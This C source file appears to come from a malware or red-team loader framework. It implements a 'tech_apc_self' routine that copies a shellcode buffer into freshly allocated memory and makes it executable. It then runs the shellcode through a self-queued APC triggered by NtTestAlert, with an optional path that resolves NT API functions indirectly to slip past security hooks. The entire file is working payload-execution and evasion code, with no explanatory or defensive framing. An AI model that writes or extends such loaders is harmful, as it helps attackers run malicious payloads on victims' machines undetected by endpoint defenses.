#include "../config.h"
#include "../dispatch.h"
#include "../ntapi.h"

BOOL tech_apc_self(unsigned char *sc, size_t len) {
#if USE_INDIRECT_SYSCALLS
    fnNtAllocateVirtualMemory pAlloc =
        (fnNtAllocateVirtualMemory)ntapi_resolve("NtAllocateVirtualMemory");
    fnNtProtectVirtualMemory pProtect =
        (fnNtProtectVirtualMemory)ntapi_resolve("NtProtectVirtualMemory");
    fnNtQueueApcThread pQueueApc =
        (fnNtQueueApcThread)ntapi_resolve("NtQueueApcThread");
    fnNtTestAlert pTestAlert =
        (fnNtTestAlert)ntapi_resolve("NtTestAlert");
    if (!pAlloc || !pProtect || !pQueueApc || !pTestAlert) return FALSE;

    PVOID mem = NULL;
    SIZE_T sz = len;
    if (!NT_SUCCESS(pAlloc((HANDLE)-1, &mem, 0, &sz,
                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
        return FALSE;

    memcpy(mem, sc, len);

    ULONG old = 0;
    pProtect((HANDLE)-1, &mem, &sz, PAGE_EXECUTE_READ, &old);

    pQueueApc((HANDLE)-2, mem, NULL, NULL, NULL);
    pTestAlert();
#else
    LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) return FALSE;
    memcpy(mem, sc, len);

    DWORD old;
    VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old);

    QueueUserAPC((PAPCFUNC)mem, GetCurrentThread(), 0);

    typedef LONG (NTAPI *fnNtTestAlertLocal)(VOID);
    fnNtTestAlertLocal NtTestAlert = (fnNtTestAlertLocal)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtTestAlert");
    if (!NtTestAlert) return FALSE;
    NtTestAlert();
#endif
    return TRUE;
}
